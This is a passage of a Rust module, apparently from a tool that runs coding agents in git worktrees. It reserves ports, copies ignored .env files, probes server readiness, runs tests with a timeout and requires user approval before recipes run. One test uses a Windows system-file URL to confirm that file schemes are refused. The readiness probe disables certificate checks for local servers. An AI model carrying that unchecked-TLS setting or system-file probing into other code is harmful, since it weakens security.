//! Test launches of a worktree and what goes with them: its reserved ports, the files copied from
//! the project into a new worktree, the tests run before a validation, the readiness of a server,
//! and what a step of its recipe runs.

use crate::board::PORT_BLOCK;
use crate::i18n::{self, Lang};
use crate::model::AgentMeta;
use crate::paths;
use crate::pty::{self, ShellInfo};
use anyhow::{anyhow, bail, Result};
use std::path::Path;
use std::process::Stdio;
use std::time::Duration;

// ---------- ports ----------

/// The port binds on 127.0.0.1: nothing listens on it.
pub fn port_free(port: u16) -> bool {
    std::net::TcpListener::bind(("127.0.0.1", port)).is_ok()
}

/// The variables of a reserved block, exported to its test launches.
pub fn port_env(base: Option<u16>) -> Vec<(String, String)> {
    match base {
        Some(b) => vec![
            ("ESCOUADE_PORT_BASE".into(), b.to_string()),
            (
                "ESCOUADE_PORT_END".into(),
                b.saturating_add(PORT_BLOCK - 1).to_string(),
            ),
        ],
        None => Vec::new(),
    }
}

// ---------- files copied into a new worktree ----------

/// `path` (forward slashes) matches `pattern`: `*` and `?` within a segment, `**` for any number
/// of segments.
pub fn glob_match(pattern: &str, path: &str) -> bool {
    let p: Vec<&str> = pattern
        .trim()
        .trim_start_matches("./")
        .split('/')
        .filter(|s| !s.is_empty())
        .collect();
    let s: Vec<&str> = path.split('/').filter(|s| !s.is_empty()).collect();
    match_segments(&p, &s)
}

fn match_segments(p: &[&str], s: &[&str]) -> bool {
    match p.first() {
        None => s.is_empty(),
        Some(&"**") => (0..=s.len()).any(|i| match_segments(&p[1..], &s[i..])),
        Some(seg) => !s.is_empty() && match_one(seg, s[0]) && match_segments(&p[1..], &s[1..]),
    }
}

fn match_one(pattern: &str, name: &str) -> bool {
    fn go(p: &[char], s: &[char]) -> bool {
        match p.first() {
            None => s.is_empty(),
            Some('*') => (0..=s.len()).any(|i| go(&p[1..], &s[i..])),
            Some('?') => !s.is_empty() && go(&p[1..], &s[1..]),
            Some(c) => s.first() == Some(c) && go(&p[1..], &s[1..]),
        }
    }
    let (p, s): (Vec<char>, Vec<char>) = (pattern.chars().collect(), name.chars().collect());
    go(&p, &s)
}

/// Files of `dir` that git ignores (`.gitignore`, the repository's exclude file…; folders wholly
/// ignored or untracked left out) matching one of `patterns`, relative with forward slashes. Only
/// those: a copy git does not ignore would show as the agent's change, and any commit (`git add
/// -A`) would take it.
pub async fn matching_ignored(dir: &str, patterns: &[String]) -> Vec<String> {
    if patterns.iter().all(|p| p.trim().is_empty()) {
        return Vec::new();
    }
    let out = crate::git::run(
        dir,
        &[
            "ls-files",
            "-z",
            "--others",
            "--ignored",
            "--exclude-standard",
            "--directory",
            "--no-empty-directory",
        ],
    )
    .await
    .unwrap_or_default();
    String::from_utf8_lossy(&out)
        .split('\0')
        .filter(|f| !f.is_empty() && !f.ends_with('/'))
        .filter(|f| patterns.iter().any(|p| glob_match(p, f)))
        .map(str::to_string)
        .collect()
}

/// Copies into `worktree` the files of `project` that git ignores and that match `patterns`
/// (`.env*`…), and returns them. A file that cannot be copied does not stop the others: once all were tried, the
/// error names each failing file and why.
pub async fn copy_worktree_files(
    project: &str,
    worktree: &str,
    patterns: &[String],
) -> Result<Vec<String>> {
    let files = matching_ignored(project, patterns).await;
    let mut copied = Vec::new();
    let mut failed = Vec::new();
    for f in files {
        match copy_one(project, worktree, &f) {
            Ok(()) => copied.push(f),
            Err(e) => failed.push(format!("{f} ({e})")),
        }
    }
    if failed.is_empty() {
        Ok(copied)
    } else {
        bail!("{}", failed.join(", "))
    }
}

fn copy_one(project: &str, worktree: &str, file: &str) -> std::io::Result<()> {
    let to = Path::new(worktree).join(file);
    if let Some(parent) = to.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::copy(Path::new(project).join(file), &to).map(|_| ())
}

// ---------- readiness ----------

/// One HTTP request to `url`, without any proxy, 2 s at most: true for any answer, whatever its
/// status (a 404 still means the server is up). A redirect is an answer, not followed (it may
/// lead to a host that is down), and a certificate is not checked (a dev server's own). Only an
/// http or https address is probed: anything else is not ready.
pub async fn http_ready(url: &str) -> bool {
    let Ok(url) = reqwest::Url::parse(url) else {
        return false;
    };
    if !matches!(url.scheme(), "http" | "https") {
        return false;
    }
    let Ok(client) = reqwest::Client::builder()
        // A local server must never be reached through the user's proxy.
        .no_proxy()
        .redirect(reqwest::redirect::Policy::none())
        // Only a readiness probe of the machine's own servers: nothing it reads is trusted (and
        // the system's certificates are not even loaded, every 500 ms).
        .danger_accept_invalid_certs(true)
        .tls_built_in_root_certs(false)
        .timeout(Duration::from_secs(2))
        .build()
    else {
        return false;
    };
    client.get(url).send().await.is_ok()
}

// ---------- tests before a validation ----------

/// What the tests run before a validation (or any command run without a window) gave.
#[derive(Debug, Clone, PartialEq)]
pub struct TestRun {
    pub passed: bool,
    /// Its exit code, when it has one.
    pub code: Option<i32>,
    /// Their last lines, for the agent.
    pub tail: String,
}

pub fn tail_lines(text: &str, n: usize) -> String {
    let lines: Vec<&str> = text.trim_end().lines().collect();
    lines[lines.len().saturating_sub(n)..].join("\n")
}

/// The arguments making `shell` run `command` and end with its exit code, as launch commands do.
fn shell_args(shell_id: &str, command: &str) -> Vec<String> {
    match shell_id {
        "pwsh" | "powershell" => vec![
            "-NoLogo".into(),
            "-Command".into(),
            pty::with_exit_code(command),
        ],
        "bash" => vec!["--login".into(), "-c".into(), command.into()],
        "wsl" => vec!["--".into(), "bash".into(), "-lc".into(), command.into()],
        "zsh" => pty::zsh_command_args(command).map(String::from).into(),
        _ => vec!["-l".into(), "-c".into(), command.into()],
    }
}

/// Runs `command` in `cwd` with `shell`, `env` added; killed with what it started past `limit`.
/// The tail of tests that did not finish says so in `lang`: it goes to the agent.
pub async fn run_tests(
    shell: &ShellInfo,
    cwd: &str,
    command: &str,
    env: &[(String, String)],
    limit: Duration,
    lang: Lang,
) -> Result<TestRun> {
    Ok(run_command(shell, cwd, command, env, limit)
        .await?
        .unwrap_or_else(|| TestRun {
            passed: false,
            code: None,
            tail: unfinished_tests(lang, (limit.as_secs() / 60).max(1)),
        }))
}

/// What stands for the output of tests stopped after `minutes`, told to the agent.
fn unfinished_tests(lang: Lang, minutes: u64) -> String {
    tr_in!(
        lang,
        "Les tests n'ont pas fini en {minutes} min.",
        "The tests didn’t finish in {minutes} min."
    )
}

/// Runs `command` in `cwd` with `shell`, `env` added, without a window: how it ended and its last
/// lines, or None when it did not end within `limit` (killed then with what it started).
pub async fn run_command(
    shell: &ShellInfo,
    cwd: &str,
    command: &str,
    env: &[(String, String)],
    limit: Duration,
) -> Result<Option<TestRun>> {
    run_streaming(shell, cwd, command, env, limit, &|_| {}).await
}

/// How many of its last lines a command run without a window keeps (`TestRun::tail`).
const TAIL_LINES: usize = 80;

/// A line of a command's output is cut after this many bytes: one that never ends (minified
/// output, a progress bar drawn over itself) must not grow without bound in memory.
const MAX_LINE: usize = 16 * 1024;

/// A command's output cut into lines as it comes, each as it is shown (`shown_line`).
#[derive(Default)]
struct LineReader {
    /// The start of a line not ended yet.
    partial: Vec<u8>,
}

impl LineReader {
    /// The lines `chunk` ends, with what the chunks before left of the first.
    fn feed(&mut self, chunk: &[u8]) -> Vec<String> {
        let mut lines = Vec::new();
        for part in chunk.split_inclusive(|&b| b == b'\n') {
            let ended = part.ends_with(b"\n");
            self.partial
                .extend_from_slice(part.strip_suffix(b"\n").unwrap_or(part));
            while self.partial.len() > MAX_LINE {
                let rest = self.partial.split_off(char_start(&self.partial, MAX_LINE));
                lines.push(shown_line(&std::mem::replace(&mut self.partial, rest)));
            }
            if ended {
                lines.push(shown_line(&self.partial));
                self.partial.clear();
            }
        }
        lines
    }

    /// The last line, when the output did not end with a line break.
    fn finish(self) -> Option<String> {
        (!self.partial.is_empty()).then(|| shown_line(&self.partial))
    }
}

/// The start of the character at `at` in `bytes` (UTF-8), or `at` itself when none is found: a cut
/// there leaves no half character on either side.
fn char_start(bytes: &[u8], at: usize) -> usize {
    (1..=at)
        .rev()
        .find(|&i| bytes[i] & 0xC0 != 0x80)
        .unwrap_or(at)
}

/// A line of output as a terminal leaves it: what comes after its last carriage return (a progress
/// bar draws over itself), without its ANSI codes. Read as UTF-8, whatever it is.
fn shown_line(bytes: &[u8]) -> String {
    let text = String::from_utf8_lossy(bytes);
    // Every carriage return of its end: a line break written as CRLF through a CRLF translation
    // ends with two (Python relaying a tool's output, pip, tox…).
    let text = text.trim_end_matches('\r');
    crate::agent::strip_ansi(text.rsplit('\r').next().unwrap_or_default())
}

/// The output of a command could not be read to its end: what it wrote is not all known, whatever
/// its exit code says.
#[derive(Debug)]
pub struct OutputLost(pub std::io::Error);

impl OutputLost {
    pub fn text(&self, lang: Lang) -> String {
        let e = &self.0;
        tr_in!(
            lang,
            "la sortie de la commande n'a pas pu être lue : {e}",
            "the command’s output couldn’t be read: {e}"
        )
    }
}

impl std::fmt::Display for OutputLost {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.text(i18n::ui()))
    }
}

impl std::error::Error for OutputLost {}

/// Reads `pipe` to its end, handing to `take` the lines each chunk read ends. A read that fails
/// is not its end: what was read is handed over all the same, and the failure returned (the pipe
/// then closed, the command's writes to it fail instead of waiting to be read).
async fn read_lines(
    pipe: Option<impl tokio::io::AsyncRead + Unpin>,
    take: &(impl Fn(Vec<String>) + Sync),
) -> std::io::Result<()> {
    use tokio::io::AsyncReadExt;
    let Some(mut pipe) = pipe else { return Ok(()) };
    let mut reader = LineReader::default();
    let mut chunk = vec![0; 8 * 1024];
    let read = loop {
        match pipe.read(&mut chunk).await {
            Ok(0) => break Ok(()),
            Ok(n) => {
                let lines = reader.feed(&chunk[..n]);
                if !lines.is_empty() {
                    take(lines);
                }
            }
            Err(e) if e.kind() == std::io::ErrorKind::Interrupted => {}
            Err(e) => break Err(e),
        }
    };
    if let Some(last) = reader.finish() {
        take(vec![last]);
    }
    read
}

/// Runs `command` as `run_command` does, handing to `on_lines` what it writes as it comes: the
/// lines of its output and of its errors in the order they are read, a few at a time, each as a
/// terminal leaves it. Only its last lines are kept, whatever it writes.
pub async fn run_streaming(
    shell: &ShellInfo,
    cwd: &str,
    command: &str,
    env: &[(String, String)],
    limit: Duration,
    on_lines: &(dyn Fn(&[String]) + Sync),
) -> Result<Option<TestRun>> {
    let mut cmd = tokio::process::Command::new(&shell.path);
    cmd.args(shell_args(&shell.id, command))
        .current_dir(cwd)
        .envs(env.iter().cloned())
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true);
    if shell.id == "bash" {
        // Git Bash stays in the working directory instead of going home.
        cmd.env("CHERE_INVOKING", "1");
    }
    #[cfg(windows)]
    cmd.creation_flags(crate::claude::CREATE_NO_WINDOW);
    crate::job::isolate(&mut cmd);
    let mut child = cmd.spawn()?;
    let job = crate::job::Job::for_child(&child);
    let (stdout, stderr) = (child.stdout.take(), child.stderr.take());
    let tail = parking_lot::Mutex::new(std::collections::VecDeque::new());
    let take = |lines: Vec<String>| {
        {
            let mut tail = tail.lock();
            tail.extend(lines.iter().cloned());
            let excess = tail.len().saturating_sub(TAIL_LINES);
            tail.drain(..excess);
        }
        on_lines(&lines);
    };
    // Both pipes to their end (a process left running that holds them is waited for, as it was
    // when the output was read whole), then the exit.
    let run = async {
        let (out, err) = tokio::join!(read_lines(stdout, &take), read_lines(stderr, &take));
        (child.wait().await, out.and(err))
    };
    match tokio::time::timeout(limit, run).await {
        Ok((status, read)) => {
            let status = status?;
            // Not a pass, nor a failure of its own, with part of what it wrote missing.
            if let Err(e) = read {
                log::warn!("output of `{command}` lost: {e}");
                return Err(OutputLost(e).into());
            }
            let tail = Vec::from(std::mem::take(&mut *tail.lock())).join("\n");
            Ok(Some(TestRun {
                passed: status.success(),
                code: status.code(),
                tail: tail.trim_end().to_string(),
            }))
        }
        Err(_) => {
            if let Some(j) = &job {
                j.terminate();
            }
            Ok(None)
        }
    }
}

// ---------- steps of a recipe ----------

/// What a step of a recipe runs, where, with which variables.
#[derive(Debug, Clone, PartialEq)]
pub struct RunSpec {
    pub name: String,
    pub command: String,
    pub cwd: String,
    pub env: Vec<(String, String)>,
}

/// Why a recipe the user has not read runs nothing.
pub fn not_approved(lang: Lang) -> String {
    tr_in!(
        lang,
        "La recette n'a pas été approuvée : lance « ▶ Tester » pour la lire avant qu'elle tourne.",
        "The recipe hasn’t been approved: run “▶ Test” to read it before it runs."
    )
}

/// Why an isola configuration the user has not read starts nothing.
pub fn isola_not_approved(lang: Lang) -> String {
    tr_in!(
        lang,
        "La configuration d'isola (.isola.toml) n'a pas été approuvée : lance « ▶ Tester » pour la lire avant qu'elle tourne.",
        "isola’s configuration (.isola.toml) hasn’t been approved: run “▶ Test” to read it before it runs."
    )
}

/// The name of the terminal of a step of a recipe that has none of its own: its preparation's
/// (« Préparation 1 »), a process without a name (« processus 2 »).
fn step_name(lang: Lang, kind: &str, index: usize) -> String {
    let n = index + 1;
    match kind {
        "prep" => tr_in!(lang, "Préparation {n}", "Setup {n}"),
        _ => tr_in!(lang, "processus {n}", "process {n}"),
    }
}

/// `isola up` runs the services and setup commands of the worktree's `.isola.toml`, which the agent
/// can write: it starts only when `config`, the file as it is now, is the content the user approved.
pub fn check_isola_approved(meta: &AgentMeta, config: &str) -> Result<()> {
    match &meta.approved_isola {
        Some(approved) if approved.config == config => Ok(()),
        _ => bail!(isola_not_approved(i18n::ui())),
    }
}

/// Step `index` of the agent's recipe: its preparation ("prep") or its processes ("run"). Its
/// folder must stay inside the worktree; the reserved ports come first in its variables.
pub fn run_spec(meta: &AgentMeta, kind: &str, index: usize) -> Result<RunSpec> {
    let recipe = meta.recipe.as_ref().ok_or_else(|| {
        anyhow!(tr!(
            "Cet agent n'a pas de recette de lancement.",
            "This agent has no launch recipe."
        ))
    })?;
    // Defense in depth: whatever the window did, a recipe the user did not read runs nothing.
    if meta.approved_recipe.as_ref() != Some(recipe) {
        bail!(not_approved(i18n::ui()));
    }
    let root = meta
        .worktree
        .as_ref()
        .map(|w| w.path.clone())
        .unwrap_or_else(|| meta.cwd.clone());
    let (name, command, dir, extra): (String, String, String, Vec<(String, String)>) = match kind {
        "prep" => {
            let s = recipe.prepare.get(index).ok_or_else(|| {
                anyhow!(tr!(
                    "Étape de préparation introuvable.",
                    "Setup step not found."
                ))
            })?;
            (
                step_name(i18n::ui(), kind, index),
                s.command.clone(),
                s.dir.clone(),
                Vec::new(),
            )
        }
        "run" => {
            let p = recipe
                .processes
                .get(index)
                .ok_or_else(|| anyhow!(tr!("Processus introuvable.", "Process not found.")))?;
            let name = if p.name.trim().is_empty() {
                step_name(i18n::ui(), kind, index)
            } else {
                p.name.clone()
            };
            let env = p.env.iter().map(|(k, v)| (k.clone(), v.clone())).collect();
            (name, p.command.clone(), p.dir.clone(), env)
        }
        other => bail!(tr!(
            "Type d'étape inconnu : « {other} »",
            "Unknown kind of step: “{other}”"
        )),
    };
    let dir = dir.trim();
    let cwd = if dir.is_empty() || dir == "." {
        root.clone()
    } else {
        paths::contained(Path::new(&root), dir)?
            .to_string_lossy()
            .into_owned()
    };
    if !Path::new(&cwd).is_dir() {
        bail!(tr!(
            "Le dossier « {dir} » n'existe pas dans le worktree",
            "The folder “{dir}” doesn’t exist in the worktree"
        ));
    }
    let mut env = port_env(meta.port_base);
    env.extend(extra);
    Ok(RunSpec {
        name,
        command,
        cwd,
        env,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::{IsolaApproval, RecipeProcess, RecipeStep, Settings, TestRecipe, Worktree};
    use crate::paths::test_dir;
    use std::io::{Read, Write};
    use std::net::TcpListener;

    fn git(dir: &Path, args: &[&str]) {
        let ok = std::process::Command::new("git")
            .arg("-C")
            .arg(dir)
            .args(args)
            .status()
            .unwrap()
            .success();
        assert!(ok, "git {args:?}");
    }

    #[test]
    fn globs_match_one_segment_or_any_depth() {
        assert!(glob_match(".env*", ".env") && glob_match(".env*", ".env.local"));
        assert!(!glob_match(".env*", "web/.env"));
        assert!(glob_match("**/.env*", "web/.env.local") && glob_match("**/.env*", ".env"));
        assert!(glob_match("config/?.json", "config/a.json"));
        assert!(!glob_match("config/?.json", "config/ab.json"));
        assert!(glob_match("./secrets/*.key", "secrets/a.key"));
        assert!(!glob_match("", ".env"));
    }

    #[tokio::test]
    async fn only_ignored_files_matching_the_patterns_are_copied_into_a_worktree() {
        let p = test_dir("launch-copy");
        git(&p, &["init", "-q", "-b", "main"]);
        std::fs::create_dir_all(p.join("web")).unwrap();
        std::fs::write(p.join("web").join("index.ts"), "x").unwrap();
        std::fs::write(p.join(".gitignore"), ".env\n.env.local\nnode_modules/\n").unwrap();
        git(&p, &["add", "-A"]);
        git(
            &p,
            &[
                "-c",
                "user.email=t@t",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                "init",
            ],
        );
        std::fs::write(p.join(".env"), "A=1").unwrap();
        std::fs::write(p.join("web").join(".env.local"), "B=2").unwrap();
        std::fs::create_dir_all(p.join("node_modules").join("x")).unwrap();
        std::fs::write(p.join("node_modules").join("x").join(".env"), "no").unwrap();
        std::fs::write(p.join("notes.txt"), "n").unwrap();
        // Matching, but neither ignored: copied, they would show as changes and be committed.
        std::fs::write(p.join(".env.example"), "A=").unwrap();
        std::fs::write(p.join("web").join(".env.test"), "B=").unwrap();
        let wt = test_dir("launch-copy-wt");
        let patterns = vec![
            ".env*".to_string(),
            "**/.env*".to_string(),
            "notes.txt".to_string(),
        ];
        let (from, to) = (
            p.to_string_lossy().to_string(),
            wt.to_string_lossy().to_string(),
        );
        let mut copied = copy_worktree_files(&from, &to, &patterns).await.unwrap();
        copied.sort();
        assert_eq!(copied, [".env", "web/.env.local"]);
        assert_eq!(
            std::fs::read_to_string(wt.join("web").join(".env.local")).unwrap(),
            "B=2"
        );
        assert!(!wt.join("notes.txt").exists() && !wt.join("node_modules").exists());
        assert!(!wt.join(".env.example").exists() && !wt.join("web").join(".env.test").exists());
        // The board's guard checks the same list.
        let mut listed = matching_ignored(&from, &patterns).await;
        listed.sort();
        assert_eq!(listed, copied);
        assert!(copy_worktree_files(&from, &to, &[])
            .await
            .unwrap()
            .is_empty());
    }

    #[tokio::test]
    async fn a_file_that_cannot_be_copied_is_reported_and_the_others_are_still_copied() {
        let p = test_dir("launch-copy-fail");
        git(&p, &["init", "-q", "-b", "main"]);
        std::fs::write(p.join(".gitignore"), ".env*\n").unwrap();
        std::fs::write(p.join(".env.a"), "A=1").unwrap();
        std::fs::write(p.join(".env.b"), "B=2").unwrap();
        let wt = test_dir("launch-copy-fail-wt");
        // A folder where the first file should go: it cannot be written.
        std::fs::create_dir_all(wt.join(".env.a")).unwrap();
        let patterns = vec![".env*".to_string()];
        let (from, to) = (
            p.to_string_lossy().to_string(),
            wt.to_string_lossy().to_string(),
        );
        let err = copy_worktree_files(&from, &to, &patterns)
            .await
            .unwrap_err()
            .to_string();
        assert!(err.contains(".env.a"), "{err}");
        assert!(!err.contains(".env.b"), "{err}");
        assert_eq!(
            std::fs::read_to_string(wt.join(".env.b")).unwrap(),
            "B=2",
            "the file after the failing one is still copied"
        );
    }

    #[test]
    fn a_port_is_free_only_when_it_binds() {
        let busy = TcpListener::bind(("127.0.0.1", 0)).unwrap();
        let port = busy.local_addr().unwrap().port();
        assert!(!port_free(port));
        drop(busy);
        assert!(port_free(port));
    }

    #[test]
    fn a_block_exports_its_first_and_last_ports_and_a_corrupt_one_cannot_overflow() {
        assert!(port_env(None).is_empty());
        assert_eq!(
            port_env(Some(4100))[1],
            ("ESCOUADE_PORT_END".to_string(), "4109".to_string())
        );
        // A base read back from a damaged file must not panic on the last port.
        assert_eq!(port_env(Some(u16::MAX))[1].1, "65535");
    }

    /// A server answering every request with `status` (and `Location: location` when given), on a
    /// port of its own.
    fn server_answering(status: &'static str, location: Option<String>) -> u16 {
        let l = TcpListener::bind(("127.0.0.1", 0)).unwrap();
        let port = l.local_addr().unwrap().port();
        std::thread::spawn(move || {
            for mut s in l.incoming().flatten() {
                let mut buf = [0u8; 2048];
                let _ = s.read(&mut buf);
                let location = location
                    .as_ref()
                    .map(|l| format!("Location: {l}\r\n"))
                    .unwrap_or_default();
                let _ = s.write_all(
                    format!(
                        "HTTP/1.1 {status}\r\n{location}Content-Length: 0\r\nConnection: close\r\n\r\n"
                    )
                    .as_bytes(),
                );
            }
        });
        port
    }

    /// A server answering every request with a 404, on a port of its own.
    fn not_found_server() -> u16 {
        server_answering("404 Not Found", None)
    }

    #[tokio::test]
    async fn a_server_that_redirects_is_ready_without_following_the_redirect() {
        // To an address nothing listens on: following the redirect would fail.
        let away = server_answering("302 Found", Some("http://127.0.0.1:1/".into()));
        assert!(http_ready(&format!("http://127.0.0.1:{away}/")).await);
        // To itself: following the redirect would loop until the client gives up.
        let looping = server_answering("302 Found", Some("/encore".into()));
        assert!(http_ready(&format!("http://127.0.0.1:{looping}/")).await);
    }

    #[tokio::test]
    async fn a_server_is_ready_once_it_answers_whatever_its_status() {
        let port = not_found_server();
        assert!(http_ready(&format!("http://localhost:{port}/connexion")).await);
        let closed = TcpListener::bind(("127.0.0.1", 0))
            .unwrap()
            .local_addr()
            .unwrap()
            .port();
        assert!(!http_ready(&format!("http://127.0.0.1:{closed}/")).await);
        assert!(!http_ready("pas une adresse").await);
    }

    #[tokio::test]
    async fn only_an_http_or_https_address_is_probed() {
        let port = not_found_server();
        // The scheme is read as an address reads it, whatever its case.
        assert!(http_ready(&format!("HTTP://127.0.0.1:{port}/")).await);
        for other in ["ftp", "ws", "file", "gopher"] {
            assert!(
                !http_ready(&format!("{other}://127.0.0.1:{port}/")).await,
                "{other}"
            );
        }
        assert!(!http_ready("file:///C:/Windows/win.ini").await);
    }

    fn default_shell() -> Option<ShellInfo> {
        pty::detect_shells(&Settings::default()).into_iter().next()
    }

    #[tokio::test]
    async fn tests_report_their_outcome_and_their_last_lines_with_the_ports_exported() {
        let Some(shell) = default_shell() else { return };
        let dir = test_dir("launch-tests").to_string_lossy().to_string();
        let env = port_env(Some(4130));
        let ok = run_tests(
            &shell,
            &dir,
            "node -e \"process.exit(process.env.ESCOUADE_PORT_END === '4139' ? 0 : 4)\"",
            &env,
            Duration::from_secs(120),
            Lang::Fr,
        )
        .await
        .unwrap();
        assert!(ok.passed, "{}", ok.tail);
        let ko = run_tests(
            &shell,
            &dir,
            "node -e \"for (let i = 1; i <= 100; i++) console.log('ligne ' + i); process.exit(2)\"",
            &env,
            Duration::from_secs(120),
            Lang::Fr,
        )
        .await
        .unwrap();
        assert!(!ko.passed);
        assert_eq!(ko.tail.lines().count(), 80, "{}", ko.tail);
        assert!(ko.tail.trim_end().ends_with("ligne 100"), "{}", ko.tail);
    }

    #[test]
    fn output_is_cut_into_lines_as_it_comes_and_each_is_shown_as_a_terminal_leaves_it() {
        let mut r = LineReader::default();
        // A line ended by the next chunk, Windows' line endings, colors.
        assert_eq!(r.feed(b"un\r\nde"), ["un"]);
        assert_eq!(r.feed(b"ux\n\x1b[32mtrois\x1b[0m\n"), ["deux", "trois"]);
        // CRLF written through a CRLF translation (Python relaying a tool's output, pip, tox…).
        assert_eq!(r.feed(b"x\r\r\n"), ["x"]);
        // A progress bar drawn over itself: what it shows last.
        assert_eq!(r.feed(b"10%\r50%\r100%\r\n"), ["100%"]);
        assert_eq!(r.feed(b"\n"), [""]);
        assert!(r.feed(b"").is_empty());
        // Not UTF-8 (a console's code page): read all the same.
        assert_eq!(r.feed(b"caf\xe9\n"), ["caf\u{fffd}"]);
        // A line that never ends is cut, so that it does not grow without bound, between two
        // characters.
        let long = format!("a{}", "é".repeat(MAX_LINE));
        let lines = r.feed(long.as_bytes());
        assert!(!lines.is_empty());
        assert!(lines
            .iter()
            .all(|l| l.len() <= MAX_LINE && !l.contains('\u{fffd}')));
        // Its end comes once the output does.
        let rest = r.finish().expect("the end of the line");
        assert_eq!(format!("{}{rest}", lines.concat()), long);
        assert_eq!(LineReader::default().finish(), None);
    }

    /// A pipe that gives `data`, then fails.
    struct Failing(Option<&'static [u8]>);

    impl tokio::io::AsyncRead for Failing {
        fn poll_read(
            mut self: std::pin::Pin<&mut Self>,
            _: &mut std::task::Context<'_>,
            buf: &mut tokio::io::ReadBuf<'_>,
        ) -> std::task::Poll<std::io::Result<()>> {
            std::task::Poll::Ready(match self.0.take() {
                Some(data) => {
                    buf.put_slice(data);
                    Ok(())
                }
                None => Err(std::io::Error::other("tube cassé")),
            })
        }
    }

    #[tokio::test]
    async fn a_pipe_that_fails_is_not_taken_for_the_end_of_the_output() {
        let seen = parking_lot::Mutex::new(Vec::new());
        let read = read_lines(Some(Failing(Some(b"un\ndeu"))), &|l: Vec<String>| {
            seen.lock().extend(l)
        })
        .await;
        // What was read is handed over, and the failure is told.
        assert_eq!(seen.into_inner(), ["un", "deu"]);
        assert_eq!(read.unwrap_err().to_string(), "tube cassé");
        // As it reads, the command run says so instead of passing on part of its output.
        let lost = anyhow::Error::from(OutputLost(std::io::Error::other("tube cassé")));
        assert_eq!(
            lost.to_string(),
            "la sortie de la commande n'a pas pu être lue : tube cassé"
        );
        assert!(lost.downcast_ref::<OutputLost>().is_some());
    }

    #[test]
    fn a_launch_refused_or_cut_short_says_why_in_english() {
        use crate::i18n::Lang::En;
        assert_eq!(
            not_approved(En),
            "The recipe hasn’t been approved: run “▶ Test” to read it before it runs."
        );
        assert_eq!(
            isola_not_approved(En),
            "isola’s configuration (.isola.toml) hasn’t been approved: run “▶ Test” to read it before it runs."
        );
        assert_eq!(
            OutputLost(std::io::Error::other("broken pipe")).text(En),
            "the command’s output couldn’t be read: broken pipe"
        );
        assert_eq!(
            unfinished_tests(En, 20),
            "The tests didn’t finish in 20 min."
        );
        assert_eq!(
            [step_name(En, "prep", 0), step_name(En, "run", 1)],
            ["Setup 1", "process 2"]
        );
    }

    #[tokio::test]
    async fn a_commands_lines_are_handed_over_as_it_writes_them_its_errors_too() {
        let Some(shell) = default_shell() else { return };
        let dir = test_dir("launch-stream");
        // Two lines, a pause, then a line on stderr and the end.
        std::fs::write(
            dir.join("steps.cjs"),
            "console.log('un'); console.log('deux'); setTimeout(() => { console.error('trois'); process.exit(3); }, 2000);",
        )
        .unwrap();
        let seen = parking_lot::Mutex::new(Vec::new());
        let started = std::time::Instant::now();
        let run = run_streaming(
            &shell,
            &dir.to_string_lossy(),
            "node steps.cjs",
            &[],
            Duration::from_secs(60),
            &|lines: &[String]| seen.lock().push((started.elapsed(), lines.to_vec())),
        )
        .await
        .unwrap()
        .expect("ended");
        let ended = started.elapsed();
        let seen = seen.into_inner();
        let lines: Vec<&str> = seen
            .iter()
            .flat_map(|(_, l)| l.iter().map(String::as_str))
            .collect();
        assert_eq!(lines, ["un", "deux", "trois"]);
        // Handed over as it was written, not once the command ended.
        let first = seen[0].0;
        assert!(
            ended.saturating_sub(first) >= Duration::from_millis(1000),
            "first lines at {first:?}, end at {ended:?}"
        );
        assert_eq!((run.passed, run.code), (false, Some(3)));
        assert_eq!(run.tail, "un\ndeux\ntrois");
    }

    #[tokio::test]
    async fn a_zsh_command_reads_the_zshrc_like_a_terminal() {
        let Some(zsh) = pty::detect_shells(&Settings::default())
            .into_iter()
            .find(|s| s.id == "zsh")
        else {
            eprintln!("zsh not installed: skipped");
            return;
        };
        // Version managers (rbenv, nvm, asdf…) set themselves up there: without it, a worktree's
        // `bundle install` runs with the system's Ruby.
        let home = test_dir("launch-zshrc-steps");
        std::fs::write(home.join(".zshrc"), "export ESCOUADE_FROM_ZSHRC=oui\n").unwrap();
        let env = [("ZDOTDIR".to_string(), home.to_string_lossy().into_owned())];
        let run = run_command(
            &zsh,
            &home.to_string_lossy(),
            "echo zshrc=$ESCOUADE_FROM_ZSHRC",
            &env,
            Duration::from_secs(60),
        )
        .await
        .unwrap()
        .expect("ended");
        assert!(run.passed && run.tail.contains("zshrc=oui"), "{}", run.tail);
    }

    /// Whether the process `pid` is running.
    fn alive(pid: u32) -> bool {
        #[cfg(windows)]
        {
            let out = std::process::Command::new("tasklist")
                .args(["/FI", &format!("PID eq {pid}"), "/NH", "/FO", "CSV"])
                .output()
                .unwrap();
            // The rows are CSV: "node.exe","1234","Console",…
            String::from_utf8_lossy(&out.stdout).contains(&format!("\"{pid}\""))
        }
        #[cfg(unix)]
        {
            // SAFETY: signal 0 only checks that the process exists.
            unsafe { libc::kill(pid as i32, 0) == 0 }
        }
    }

    #[tokio::test]
    async fn tests_running_past_their_limit_are_stopped_with_everything_they_started() {
        let Some(shell) = default_shell() else { return };
        let dir = test_dir("launch-tests-slow");
        // The tests start a process of their own, which records its pid and waits: the shell, the
        // tests and that process are three levels of the tree to stop.
        std::fs::write(
            dir.join("grandchild.cjs"),
            "require('fs').writeFileSync('pid.txt', String(process.pid)); setTimeout(() => {}, 60000);",
        )
        .unwrap();
        std::fs::write(
            dir.join("tests.cjs"),
            "require('child_process').spawn(process.execPath, ['grandchild.cjs'], { stdio: 'ignore' }); setTimeout(() => {}, 60000);",
        )
        .unwrap();
        let r = run_tests(
            &shell,
            &dir.to_string_lossy(),
            "node tests.cjs",
            &[],
            Duration::from_secs(8),
            Lang::Fr,
        )
        .await
        .unwrap();
        assert!(!r.passed);
        assert!(r.tail.contains("n'ont pas fini"), "{}", r.tail);
        let pid: u32 = std::fs::read_to_string(dir.join("pid.txt"))
            .expect("the process started by the tests did not start within the limit")
            .trim()
            .parse()
            .unwrap();
        for _ in 0..100 {
            if !alive(pid) {
                return;
            }
            std::thread::sleep(Duration::from_millis(50));
        }
        panic!("process {pid}, started by the tests, survived them");
    }

    #[test]
    fn a_recipe_runs_only_once_the_user_approved_exactly_that_recipe() {
        let wt = test_dir("launch-approval");
        std::fs::create_dir_all(wt.join("web")).unwrap();
        let recipe = TestRecipe {
